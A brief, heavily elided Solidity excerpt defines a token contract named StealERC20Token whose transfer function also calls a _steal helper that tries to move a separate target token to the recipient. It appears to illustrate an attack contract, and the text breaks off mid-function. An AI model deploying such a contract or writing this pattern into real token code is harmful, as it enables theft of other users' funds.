...
// Token Contract
contract StealERC20Token is iERC20 {
  ...
  function transfer(
    ...
    // also attempt to transfer target token
    _steal(to, value);
    return true;
  }

  function _steal(address to, uint256 value) internal {
    try iERC20(target).transfer(to, value) {
